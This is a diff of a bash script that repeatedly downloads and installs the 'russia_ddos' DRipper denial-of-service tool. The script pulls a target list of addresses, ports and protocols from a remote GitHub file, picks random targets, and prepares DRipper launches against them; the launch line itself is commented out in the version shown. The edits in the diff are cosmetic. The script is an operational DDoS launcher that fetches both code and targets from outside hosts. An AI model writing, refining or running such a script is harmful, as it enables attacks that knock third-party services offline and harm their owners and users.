@@ -29,13 +29,13 @@ do
    # Download latest version of DDripper.
    cd ~
    rm -rf russia_ddos
-   git clone https://github.com/alexmon1989/russia_ddos.git
+   git -q clone https://github.com/alexmon1989/russia_ddos.git
    cd russia_ddos
    pip install -r requirements.txt
    
    # Number of targets in DRipper_targets
    list_size=$(curl -s https://raw.githubusercontent.com/KarboDuck/karbo-wiki/master/DRipper_targets | cat | wc -l)
-   echo "\n===================================="
+   echo -e "\n===================================="
    echo -e "Number of targets in list: " $list_size "\n"
 
    # Get multiple random numbers to choose multiple targets from DRipper_targets
@@ -55,14 +55,14 @@ do
    # Launch multiple DRipper.py instances
    for i in $random_numbers
    do
-             # Get address, port and protocol from pre-selected targetle
-             site=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/KarboDuck/karbo-wiki/master/DRipper_targets | cat)")
+            # Get address, port and protocol from pre-selected targetle
+            site=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/KarboDuck/karbo-wiki/master/DRipper_targets | cat)")
 
-             addr=$(echo $site | awk '{print $1}')
-             port=$(echo $site | awk '{print $2}')
-             prot=$(echo $site | awk '{print $3}')
-    echo $site
-    echo $addr $port $prot
+            addr=$(echo $site | awk '{print $1}')
+            port=$(echo $site | awk '{print $2}')
+            prot=$(echo $site | awk '{print $3}')
+
+            echo $addr $port $prot
             # python3 -u ~/russia_ddos/DRipper.py -l 2048 -s $addr -p $port -m $prot -t 50&
    done
    
